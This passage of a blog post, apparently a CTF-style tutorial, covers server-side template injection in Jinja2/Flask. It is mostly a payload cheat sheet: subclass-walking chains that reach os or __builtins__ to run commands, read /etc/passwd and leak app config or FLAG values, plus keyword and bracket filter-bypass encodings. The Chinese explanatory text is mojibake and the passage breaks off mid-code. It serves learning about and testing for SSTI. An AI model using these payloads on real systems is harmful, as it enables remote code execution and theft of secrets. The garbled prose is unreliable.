&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šä»¥åˆ—è¡¨å½¢å¼è¿”å›objectåŸºç±»ä¸‹çš„æ‰€æœ‰å­ç±»ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯å…¶ä¸­å«æœ‰&lt;code>os&lt;/code>, &lt;code>file&lt;/code>, &lt;code>__builtins__&lt;/code>æ¨¡å—çš„å­ç±»ï¼›è¿™é‡Œç»™å‡ºä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥å•ç‹¬å¯»æ‰¾ç‰¹å®šå­ç±»ï¼Œä¹Ÿå¯ä»¥æ ¹æ®æƒ³è¦çš„æ¨¡å—æ‰¾åˆ°å¯¹åº”çš„å­ç±»ï¼Œè¿”å›ç´¢å¼•ä½ç½®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2 &amp;amp; py3&lt;/span>
&lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;warnings.WarningMessage&amp;#34;&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>
&lt;span style="color:#111">raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">raw&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[*] &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> - &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">keys&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108115828170.png" alt="image-20211108115828170">åˆ°è¿™ä¸€æ­¥å¯ä»¥å¾—åˆ°çš„&lt;/p>
&lt;p>åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬çš„payloadå·²ç»æ„é€ å¥½ä¸€åŠäº†ï¼ˆä»¥ä¸‹indexå‡æŒ‡æˆ‘ä»¬éœ€è¦çš„subclassçš„ç´¢å¼•ä½ç½®ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step3---è°ƒç”¨ç›¸å…³å‡½æ•°è¿›è¡Œrce">step3 - è°ƒç”¨ç›¸å…³å‡½æ•°è¿›è¡Œrce&lt;/h3>
&lt;h4 id="py2---fileoslinecache">py2 - file&amp;amp;os&amp;amp;linecache&lt;/h4>
&lt;p>&lt;code>&amp;lt;type 'file'&amp;gt;&lt;/code>æ˜¯py2çš„ä¸“å±ï¼Œç›´æ¥å¯ä»¥ç”¨&lt;code>read()&lt;/code>, &lt;code>write()&lt;/code>, &lt;code>readlines()&lt;/code>è¿›è¡Œæ–‡ä»¶è¯»å†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>os&lt;/code>æ¨¡å—å°±ä¸å¿…è¯´äº†ï¼Œæœ‰&lt;code>system()&lt;/code>å¯ä»¥ç›´æ¥rceçš„å‡½æ•°ï¼›åœ¨py2ä¸­è¿™ä¸¤ä¸ªå­ç±»å¯ä»¥ç›´æ¥ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site._Printer&amp;#39;&amp;gt;, 71&lt;/span>
&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site.Quitter&amp;#39;&amp;gt;, 76&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;FLAG]}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸å«Œéº»çƒ¦çš„è¿˜å¯ä»¥å†å¥—ä¸€å±‚ï¼Œç”¨&lt;code>linecache&lt;/code>æ¥è°ƒç”¨&lt;code>os&lt;/code>ï¼Œpy2ä¸­æœ‰è¿™ä¸¤ä¸ªç±»å«æœ‰&lt;code>linecache&lt;/code>æ¨¡å—&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, 58&lt;/span>
&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;, 59&lt;/span>
&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;linecache&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="py3---__builtins__">py3 - __builtins__&lt;/h4>
&lt;p>py3ä¸­å°±æ²¡è¿™ä¹ˆç›´æ¥ï¼Œè¦å…³æ³¨çš„æ¨¡å—æ˜¯&lt;code>__builtins__&lt;/code>ï¼Œå€ŸåŠ©å®ƒæ¥è°ƒç”¨å†…ç½®çš„&lt;code>open()&lt;/code>è¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œç”¨&lt;code>eval()&lt;/code>å°†&lt;code>os&lt;/code>æ¨¡å—å¼•å…¥rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;whoami&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;open&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ˜¯ç›´æ¥ç”¨&lt;code>__import__&lt;/code>åŠ è½½&lt;code>os&lt;/code>æ¨¡å—æ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>py2æœ‰ä¸ªç‰¹æ®Šçš„&lt;code>commands&lt;/code>æ¨¡å—ä¹Ÿå¯ä»¥ç›´æ¥rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;commands&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getstatusoutput&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”â€”â€”æ³¨æ„å¼•ç”¨&lt;code>__builtins__&lt;/code>å†…å»ºæ¨¡å—è¿™ä¸€æ–¹å¼åœ¨py2&amp;amp;py3å®Œå…¨é€šæ€&lt;/p>
&lt;h2 id="å¸¸ç”¨payload">å¸¸ç”¨payload&lt;/h2>
&lt;p>å…¶å®ä¸Šé¢å·²ç»åˆ—ä¸¾çš„æ¯”è¾ƒå…¨å•¦ï¼Œè¿™é‡Œåšä¸€äº›å°å°çš„è¡¥å……&lt;/p>
&lt;h3 id="forè¯­å¥ç¡®å®šç´¢å¼•ä½ç½®">forè¯­å¥ç¡®å®šç´¢å¼•ä½ç½®&lt;/h3>
&lt;p>å‰é¢æåˆ°è¿‡ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦çš„å­ç±»åœ¨pythonä¸åŒç‰ˆæœ¬ä¸­ä½ç½®å¹¶ä¸å›ºå®šï¼ˆä¸»è¦æ˜¯py3 py2çš„åŸºæœ¬å›ºå®šæ­»äº†ï¼‰ï¼Œé’ˆå¯¹è¿™ä¸ªé—®é¢˜å¯ä»¥ç”¨Jinjaæ”¯æŒçš„forè¯­å¥æ¥è§£å†³ï¼Œsubmoduleçš„åå­—å¯ä»¥ç”¨ä¸Šé¢çš„è„šæœ¬è·‘&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;filename&amp;#39;, &amp;#39;r&amp;#39;).read() }}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;) }}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ç‰¹æ®Šçš„ä¸€äº›å¯¹è±¡">ç‰¹æ®Šçš„ä¸€äº›å¯¹è±¡&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{config}}
{{config.items()}}
{{config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{get_flashed_messages.__globals__[&amp;#39;current_app&amp;#39;].config}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{url_for.__globals__[&amp;#39;__builtins__&amp;#39;].__import__(&amp;#39;os&amp;#39;).system(&amp;#39;ls&amp;#39;)}}
{{url_for.__globals__[&amp;#39;current_app&amp;#39;].config.FLAG}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{request.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;/etc/passwd&amp;#39;).read()}}
{{request.application.__self__._get_data_for_json.__globals__[&amp;#39;json&amp;#39;].JSONEncoder.default.__globals__[&amp;#39;current_app&amp;#39;].config[&amp;#39;FLAG&amp;#39;]}}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="å„ç§å„æ ·çš„bypass">å„ç§å„æ ·çš„bypass&lt;/h2>
&lt;p>ä¸€èˆ¬éƒ½ä¸ä¼šåªè¿‡æ»¤ä¸€ç§çš„ï¼Œç»¼åˆåº”ç”¨&lt;/p>
&lt;h3 id="é’ˆå¯¹å…³é”®å­—çš„è¿‡æ»¤">é’ˆå¯¹å…³é”®å­—çš„è¿‡æ»¤&lt;/h3>
&lt;p>ä»¥classä¸ºä¾‹ï¼Œåšä¸€ä¸ªå­—ç¬¦ä¸²çš„æ‹¼æ¥&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;cl&amp;#39;&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;ass&amp;#39;&lt;/span> &lt;span style="color:#75715e"># æ‹¼æ¥&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cl&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;ass&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;cla&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ss&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># æ‹¼æ¥&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;Y2xhc3M=&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;base64&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># b64&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0063\u006C\u0061\u0073\u0073&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># unicode&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x63\x6c\x61\x73\x73&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># hex&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤">è¿‡æ»¤&lt;code>[]&lt;/code>&lt;/h3>
&lt;p>&lt;code>[]&lt;/code>ç”¨åœ¨å­—å…¸æŒ‰ç´¢å¼•å–å€¼å’Œæ•°ç»„ä¸­å–å€¼ï¼Œä¸è¿‡ç¦æ­¢äº†è¿˜æ˜¯æœ‰å‡½æ•°å¯ä»¥ç”¨&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>__getitem__&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span 